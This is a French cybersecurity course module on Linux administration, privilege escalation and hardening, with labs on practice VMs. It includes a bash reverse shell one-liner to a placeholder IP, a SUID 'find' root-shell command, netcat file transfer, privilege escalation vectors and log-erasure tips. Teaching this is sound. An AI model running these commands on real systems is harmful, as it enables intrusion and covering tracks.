# Module 04 — Linux

> **Objectif :** maîtriser Linux en administrateur ET en attaquant. Linux fait tourner
> l'essentiel des serveurs, du cloud, des conteneurs et des outils de sécurité. Le connaître
> en profondeur est non négociable.
>
> **Durée :** 3 semaines · **Prérequis :** module 00 (ligne de commande)

---

## 4.1 — L'architecture du système

### La philosophie Unix

- **Tout est fichier** — un périphérique, un socket, un processus (`/proc`) : tout s'expose comme un fichier. Conséquence : les mêmes outils manipulent tout.
- **De petits outils qui font une chose bien**, composables via des pipes.
- **Le texte est l'interface universelle** — d'où la puissance de grep/awk/sed.

### L'arborescence (FHS)

| Répertoire | Contenu | Intérêt sécurité |
|---|---|---|
| `/etc` | Configuration système | `passwd`, `shadow`, `sudoers`, `crontab`, config des services |
| `/home` | Données utilisateurs | Clés SSH (`.ssh`), historiques (`.bash_history`) |
| `/root` | Home de root | Cible privilégiée |
| `/var` | Données variables | **`/var/log` — les logs** ; `/var/www` — sites web |
| `/tmp`, `/dev/shm` | Temporaire (souvent world-writable) | Zone de dépôt favorite des attaquants |
| `/proc`, `/sys` | Vue du noyau et des processus | Trésor d'énumération (`/proc/*/environ`, `cmdline`) |
| `/bin`, `/usr/bin`, `/sbin` | Exécutables | Cibles de binaires SUID à auditer |
| `/opt` | Logiciels tiers | Souvent mal configuré |
| `/boot` | Noyau et bootloader | Intégrité du démarrage |

### Utilisateurs, groupes et identité

```bash
id                    # UID, GID, groupes
cat /etc/passwd       # comptes (UID 0 = root ; UID<1000 = système)
sudo cat /etc/shadow  # hash des mots de passe (lisible root uniquement)
cat /etc/group        # groupes
getent passwd         # inclut les sources distantes (LDAP…)
```

Format de `/etc/passwd` : `nom:x:UID:GID:commentaire:home:shell`
Format de `/etc/shadow` : `nom:$id$sel$hash:...` où `$6$` = SHA-512, `$y$` = yescrypt, `$2b$` = bcrypt.

> **Réflexe d'audit :** tout compte à UID 0 autre que `root` est une porte dérobée.
> Un compte avec `/bin/bash` qui ne devrait pas avoir de shell est suspect.

---

## 4.2 — Le modèle de permissions (fondamental)

### Permissions classiques

```
-rwxr-xr--   1 alice  dev   4096  ...  script.sh
│└┬┘└┬┘└┬┘
│ │  │  └── autres : r-- (4)
│ │  └───── groupe : r-x (5)
│ └──────── propriétaire : rwx (7)
└────────── type : - fichier, d dossier, l lien, ...
```

- **r=4, w=2, x=1.** `chmod 754` = rwx / r-x / r--
- Sur un **dossier** : `x` = droit de traverser, `r` = lister, `w` = créer/supprimer des entrées (⚠️ pouvoir supprimer un fichier dépend des droits sur le **dossier**, pas sur le fichier).

### Les permissions spéciales — cruciales en pentest

| Bit | Valeur | Sur fichier | Sur dossier |
|---|---|---|---|
| **SUID** | 4000 | S'exécute avec les droits du **propriétaire** | — |
| **SGID** | 2000 | S'exécute avec les droits du **groupe** | Nouveaux fichiers héritent du groupe |
| **Sticky** | 1000 | — | Seul le propriétaire peut supprimer (ex : `/tmp`) |

**Le SUID est la première chose qu'un attaquant recherche pour l'escalade de privilèges :**

```bash
find / -perm -4000 -type f 2>/dev/null       # tous les binaires SUID
find / -perm -2000 -type f 2>/dev/null       # SGID
```

Si un binaire SUID appartenant à root peut être détourné (ex : `find`, `vim`, `less`,
`awk`, `nmap` en SUID), on obtient un shell root. Le site **[GTFOBins](https://gtfobins.github.io)**
recense tous ces détournements — c'est une référence à consulter systématiquement.

```bash
# Exemple : si /usr/bin/find est SUID root
find . -exec /bin/sh -p \; -quit      # shell root instantané
```

### ACL et attributs étendus

```bash
getfacl fichier ; setfacl -m u:bob:rw fichier    # permissions plus fines que rwx
lsattr fichier ; chattr +i fichier               # +i = immuable (même root ne peut modifier)
```

L'attribut `+i` est parfois utilisé par des malwares pour se protéger, ou par des défenseurs
pour verrouiller des fichiers critiques.

---

## 4.3 — Processus, services et démarrage

### Gérer les processus

```bash
ps aux                       # snapshot
ps -ef --forest              # arbre de filiation
top / htop                   # temps réel
kill -15 PID / kill -9 PID   # SIGTERM (propre) / SIGKILL (brutal)
nohup cmd &                  # détacher un processus
jobs / fg / bg               # contrôle des tâches
lsof -p PID                  # fichiers ouverts par un processus
```

### systemd — le gestionnaire de services moderne

```bash
systemctl status ssh
systemctl start|stop|restart|enable|disable service
systemctl list-units --type=service --state=running
journalctl -u ssh -f              # logs d'un service en direct
journalctl --since "1 hour ago"
systemctl list-timers             # tâches planifiées systemd
```

> **Réflexe sécurité :** un service inconnu activé au démarrage (`systemctl list-unit-files
> --state=enabled`) ou un timer suspect est un mécanisme de **persistance** classique.

### Les tâches planifiées — vecteur de persistance

```bash
crontab -l                        # cron de l'utilisateur courant
cat /etc/crontab ; ls /etc/cron.*  # cron système
systemctl list-timers             # timers systemd
```

Un cron qui exécute un script **world-writable** = escalade de privilèges immédiate.
À auditer systématiquement.

---

## 4.4 — Réseau sous Linux

```bash
ip a                    # interfaces et adresses
ip r                    # table de routage
ss -tulpn               # ports en écoute + processus (remplace netstat)
ss -tan state established
ip neigh                # cache ARP
nmcli / iwctl           # gestion réseau/Wi-Fi

# Diagnostic
ping -c4 hote
traceroute hote
dig / host hote
curl -v https://hote
nc -zv hote 1-1000      # scan de ports rudimentaire avec netcat
```

**netcat, le couteau suisse** — à connaître parfaitement :

```bash
nc -lvnp 4444                       # écouter (listener)
nc IP 4444                          # se connecter
nc -lvnp 4444 > recu.bin            # recevoir un fichier
nc IP 4444 < fichier.bin            # envoyer un fichier
# Reverse shell (concept — voir module 08)
bash -i >& /dev/tcp/IP/4444 0>&1
```

---

## 4.5 — Les logs : où regarder

| Fichier / source | Contenu |
|---|---|
| `/var/log/auth.log` (Debian) / `secure` (RHEL) | **Authentification, sudo, SSH** — le plus important |
| `/var/log/syslog` / `messages` | Journal système général |
| `journalctl` | Journal systemd (souvent la source unique moderne) |
| `/var/log/apache2/`, `/var/log/nginx/` | Accès et erreurs web |
| `~/.bash_history` | Commandes tapées (⚠️ falsifiable/effaçable) |
| `/var/log/wtmp`, `btmp`, `lastlog` | Connexions réussies/échouées (`last`, `lastb`) |
| `/var/log/audit/audit.log` | auditd (audit fin des syscalls) |

```bash
# Détecter du brute force SSH
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
# Voir les connexions réussies
grep "Accepted" /var/log/auth.log
# Élévations sudo
grep "sudo:" /var/log/auth.log
```

> **En attaque comme en défense**, savoir *où sont les traces* et *comment on les efface*
> (`shred`, altération de wtmp, `unset HISTFILE`) est essentiel — pour les produire, les
> protéger, ou les rechercher en forensics.

---

## 4.6 — L'escalade de privilèges Linux (vue d'ensemble)

Détaillée au [module 08](08-pentest-offensive.md). Panorama des vecteurs à énumérer une fois
sur une machine avec un accès limité :

| Vecteur | Recherche | Exploitation |
|---|---|---|
| **Binaires SUID/SGID** | `find / -perm -4000` | GTFOBins |
| **sudo mal configuré** | `sudo -l` | GTFOBins (ex : `sudo vim` → `:!sh`) |
| **Cron sur fichier modifiable** | Auditer `/etc/cron*` | Injecter du code dans le script |
| **Capabilities** | `getcap -r / 2>/dev/null` | `cap_setuid`, python avec capability… |
| **Fichiers writable sensibles** | `/etc/passwd`, `/etc/shadow` inscriptibles | Ajouter un compte root |
| **Chemins/`PATH` détournables** | Scripts appelant un binaire sans chemin absolu | PATH hijacking |
| **Noyau vulnérable** | `uname -r` → CVE (DirtyPipe, DirtyCow, PwnKit) | Exploit ciblé |
| **Secrets en clair** | Historiques, `.env`, config, clés SSH | Réutilisation |
| **Groupe privilégié** | `docker`, `lxd`, `disk` | Évasion vers root |

**Outils d'énumération automatique :** [LinPEAS](https://github.com/peass-ng/PEASS-ng),
[linux-smart-enumeration (lse.sh)](https://github.com/diego-treitos/linux-smart-enumeration),
`pspy` (observer les processus/cron sans être root). **Mais** apprenez d'abord à énumérer
**à la main** — sinon vous serez perdu quand l'outil ne trouve rien.

---

## 4.7 — Le durcissement (hardening) — la vue défensive

C'est ici que Linux devient un sujet Blue Team. Les grands axes :

### Comptes et accès
- Désactiver le login root direct ; sudo nominatif et tracé
- Politique de mots de passe (PAM, `pwquality`), MFA (`pam_google_authenticator`)
- Supprimer les comptes/services inutiles (surface d'attaque minimale)

### SSH — le service le plus exposé
```bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no          # ← clés uniquement
PubkeyAuthentication yes
AllowUsers alice bob
Port 22                            # le changer n'est pas de la sécurité, juste du bruit en moins
MaxAuthTries 3
```
+ `fail2ban` pour bannir les IP qui brute-forcent.

### Système
- **Mises à jour** automatiques de sécurité (`unattended-upgrades`)
- **Pare-feu** local : `ufw` (simple) ou `nftables`
- **MAC** : SELinux (RHEL) ou AppArmor (Debian/Ubuntu) en mode enforcing
- **Journalisation** centralisée (envoi vers un SIEM), `auditd` pour l'audit fin
- **Intégrité des fichiers** : AIDE, Tripwire
- Désactiver les modules noyau inutiles, monter `/tmp` en `noexec,nosuid,nodev`

### Références de durcissement
- **CIS Benchmarks** (par distribution) — la référence, checklist exhaustive
- **ANSSI** — « Recommandations de sécurité relatives à un système GNU/Linux »
- `lynis audit system` — audit automatique de posture, très pédagogique

---

## 4.8 — Bash scripting défensif et offensif

Approfondi au [module 06](06-programmation.md). L'essentiel :

```bash
#!/usr/bin/env bash
set -euo pipefail        # -e sort sur erreur, -u interdit variables non définies,
                         # pipefail propage l'échec dans un pipe → hygiène indispensable

# Variables et conditions
nom="cible"
if [[ -f "$fichier" ]]; then echo "existe"; fi
for ip in 192.168.1.{1..254}; do ping -c1 -W1 "$ip" &>/dev/null && echo "$ip up"; done

# Fonctions
scan() { nmap -sV "$1"; }
```

> **Piège de sécurité en scripting :** toujours **guillemetter** vos variables (`"$var"`)
> pour éviter l'injection de mots et le globbing. Un script qui construit une commande par
> concaténation de variables non contrôlées est vulnérable à l'injection.

---

## ✅ Labs du module 04

- [ ] **Lab 4.1 — OverTheWire Bandit** (si pas déjà fait) niveaux 0–34. La colonne vertébrale de la maîtrise Linux.
- [ ] **Lab 4.2 — Permissions.** Créez des scénarios : un fichier lisible par un groupe seulement, un dossier sticky, un binaire SUID. Vérifiez chaque comportement empiriquement.
- [ ] **Lab 4.3 — Chasse aux SUID.** Sur Metasploitable/une VM, listez les binaires SUID, croisez avec GTFOBins, obtenez un shell root via l'un d'eux. Rédigez le write-up.
- [ ] **Lab 4.4 — sudo -l.** Configurez volontairement un `sudoers` faible (ex : `user ALL=(root) /usr/bin/vim`), puis exploitez-le. Comprenez pourquoi c'est dangereux.
- [ ] **Lab 4.5 — Analyse de logs.** À partir d'un `auth.log` (réel ou fourni), identifiez une attaque par brute force SSH, l'IP source, et le moment d'une éventuelle réussite.
- [ ] **Lab 4.6 — Durcissement.** Durcissez une VM Ubuntu fraîche : SSH par clés, fail2ban, ufw, unattended-upgrades, AppArmor. Puis lancez `lynis audit system` avant/après et comparez le score.
- [ ] **Lab 4.7 — TryHackMe.** « Linux Fundamentals 1-2-3 », « Linux PrivEsc », « Linux PrivEsc Arena ».
- [ ] **Lab 4.8 — Persistance.** Installez trois mécanismes de persistance (cron, service systemd, clé SSH ajoutée) sur une VM, puis mettez-vous en position de défenseur et retrouvez-les tous.

---

## 🎯 Auto-évaluation

1. Que signifie `chmod 4755` et pourquoi le premier chiffre est-il dangereux ?
2. Sur un dossier, à quoi sert le bit `x` ? Le bit sticky ?
3. Commande pour trouver tous les binaires SUID, et pourquoi la lance-t-on ?
4. Où sont stockés les hash de mots de passe, et comment lit-on le type d'algorithme ?
5. Vous avez `sudo -l` = `(root) NOPASSWD: /usr/bin/less`. Comment devenez-vous root ?
6. Quels fichiers de log consultez-vous pour investiguer une connexion SSH suspecte ?
7. Citez 5 vecteurs d'escalade de privilèges Linux.
8. Nommez 5 mesures de durcissement SSH.
9. Pourquoi `set -euo pipefail` est-il une bonne pratique de scripting ?

---

**Suivant → [Module 05 : Windows & Active Directory](05-windows-active-directory.md)**
